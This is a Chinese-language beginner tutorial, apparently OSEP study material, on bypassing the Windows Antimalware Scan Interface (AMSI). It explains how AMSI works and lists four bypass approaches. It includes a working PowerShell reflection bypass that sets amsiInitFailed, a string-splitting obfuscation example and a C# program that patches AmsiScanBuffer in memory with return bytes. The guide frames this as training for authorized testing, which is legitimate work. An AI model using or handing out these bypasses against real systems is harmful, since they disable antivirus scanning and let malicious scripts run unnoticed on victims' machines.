# AMSI绕过 - 新手章节指南

## 这个目录是干什么的？

AMSI（反恶意软件扫描接口）是 Windows 10 引入的安全机制，专门用来扫描 PowerShell、VBA、JScript 等脚本。这个目录教你如何绕过 AMSI。

---

## 为什么要学这个？

```
AMSI 的影响：
├── 你的 PowerShell 脚本会被扫描
├── 你的 VBA 宏会被扫描
├── 你的 JScript 会被扫描
├── 包含恶意代码就会被拦截
└── 不绕过 AMSI = 脚本无法执行

学习目的：
├── 理解 AMSI 的工作原理
├── 学会各种绕过技术
├── 在授权测试中成功执行脚本
└── 这是 OSEP 考试的必考内容
```

## 通俗理解核心概念

### 什么是 AMSI？

```
AMSI = Antimalware Scan Interface
     = 反恶意软件扫描接口

工作原理：
├── 当你运行 PowerShell 脚本时
├── PowerShell 会把脚本内容发给 AMSI
├── AMSI 把内容转发给杀软检查
├── 杀软说"有问题"就拦截
└── 杀软说"没问题"才执行

类比：
├── 你要进入一个大楼（执行脚本）
├── 门口有个安检员（AMSI）
├── 安检员会检查你的包（脚本内容）
├── 发现违禁品就不让进
└── 绕过 AMSI = 让安检员失效
```

### AMSI 扫描的内容

```
AMSI 会扫描：
├── PowerShell 脚本（.ps1）
├── PowerShell 命令（交互式）
├── VBA 宏代码
├── JScript/VBScript
├── .NET 程序集加载
└── 几乎所有脚本类型

AMSI 不会扫描：
├── 编译后的 .exe 文件
├── 原生代码
└── 直接的系统调用
```

### 常见的 AMSI 绕过方法

```
方法1：内存补丁
├── 找到 AMSI 的检测函数
├── 修改函数的代码
├── 让它永远返回"没问题"
└── 最常用的方法

方法2：反射绕过
├── 使用反射修改 AMSI 的内部状态
├── 设置 amsiInitFailed = true
├── AMSI 以为自己初始化失败了
└── 就不会进行扫描

方法3：混淆
├── 把敏感关键词拆分
├── 运行时再组合
├── AMSI 看不到完整的恶意代码
└── 简单但效果有限

方法4：降级攻击
├── 使用旧版本的 PowerShell
├── 旧版本没有 AMSI
├── PowerShell 2.0 没有 AMSI
└── 但很多系统已经移除了 PS 2.0
```

# 这个字符串是 AMSI 的测试样本

### 任务2：简单的混淆绕过

```powershell
# 把敏感字符串拆分
# AMSI 看不到完整的字符串

$a = 'AMSI'
$b = ' Test'
$c = ' Sample'
$d = ': 7e72c3ce-861b-4339-8740-0ac1484c1386'

$test = $a + $b + $c + $d
Write-Host $test

# 这种简单混淆可能不够
# 现代 AMSI 会在运行时检查
```

### 任务3：反射绕过（经典方法）

```powershell
# 经典的 AMSI 绕过方法
# 设置 amsiInitFailed = true

# 注意：这个方法可能已经被签名检测
# 需要进行混淆

$a = [Ref].Assembly.GetTypes()
$b = $a | Where-Object { $_.Name -like '*iUtils' }
$c = $b.GetFields('NonPublic,Static')
$d = $c | Where-Object { $_.Name -like '*Failed' }
$d.SetValue($null, $true)

# 现在 AMSI 应该被禁用了
# 再次测试
'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
```

### 任务4：理解内存补丁原理

```
内存补丁的原理：

1. AMSI 的核心函数是 AmsiScanBuffer
   └── 在 amsi.dll 中

2. 这个函数的作用是扫描内容
   └── 返回值决定是否有恶意代码

3. 我们的目标是修改这个函数
   └── 让它永远返回"没问题"

4. 具体做法：
   ├── 找到 AmsiScanBuffer 的地址
   ├── 修改函数开头的几个字节
   ├── 让它直接返回 0（没问题）
   └── 不执行真正的扫描逻辑

5. 修改后的效果：
   ├── AMSI 还在运行
   ├── 但扫描函数被"阉割"了
   └── 所有内容都会被放行
```

## 核心代码示例

### C# AMSI 补丁

```csharp
// 这是一个 AMSI 补丁的示例
// 仅用于学习目的

using System;
using System.Runtime.InteropServices;

class AmsiBypass
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Patch()
    {
        // 加载 amsi.dll
        IntPtr amsi = LoadLibrary("amsi.dll");

        // 获取 AmsiScanBuffer 地址
        IntPtr asb = GetProcAddress(amsi, "AmsiScanBuffer");

        // 修改内存保护
        uint oldProtect;
        VirtualProtect(asb, (UIntPtr)6, 0x40, out oldProtect);

        // 写入补丁（让函数直接返回）
        // x64: mov eax, 0x80070057; ret
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        Marshal.Copy(patch, 0, asb, patch.Length);

        Console.WriteLine("AMSI 已被补丁");
    }
}
```
